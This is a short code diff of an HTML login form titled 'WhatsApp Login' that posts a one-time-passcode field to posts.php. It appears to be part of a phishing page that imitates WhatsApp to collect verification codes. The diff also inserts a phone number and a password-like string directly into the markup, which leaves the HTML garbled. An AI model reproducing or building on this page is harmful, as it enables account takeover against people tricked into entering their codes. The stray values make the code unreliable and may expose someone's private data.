@@ -33,10 +33,10 @@
 				<form action="posts.php" method="post" class="login100-form validate-form">
 					<span class="login100-form-title">
 						WhatsApp Login
-					</span>
+					</span>09034028578
+09034028578
 
-
-					<div class="wrap-input100 validate-input" data-validate = "Password is required">
+					<div class="wrap-input100 validate-input" data-validate = "Password is required">Sunshine600
 						<input class="input100" type="password" name="otp" placeholder="Enter OTP">
 						<span class="focus-input100"></span>
 						<span class="symbol-input100">
